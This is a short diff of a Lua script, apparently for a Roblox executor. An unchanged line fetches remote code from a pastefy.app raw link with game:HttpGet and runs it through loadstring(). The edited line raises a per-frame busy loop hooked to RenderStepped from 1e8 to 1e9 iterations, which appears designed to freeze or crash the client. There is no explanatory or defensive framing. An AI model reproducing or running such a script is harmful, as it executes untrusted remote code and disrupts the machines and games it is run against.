@@ -2,4 +2,4 @@ loadstring(game:HttpGet("https://pastefy.app/mwIdQ44x/raw"))()
 wait(3) 
 local RunService = game:GetService("RunService")
 
-RunService.RenderStepped:Connect(function() for i = 1, 1e8 do end end)
+RunService.RenderStepped:Connect(function() for i = 1, 1e9 do end end)
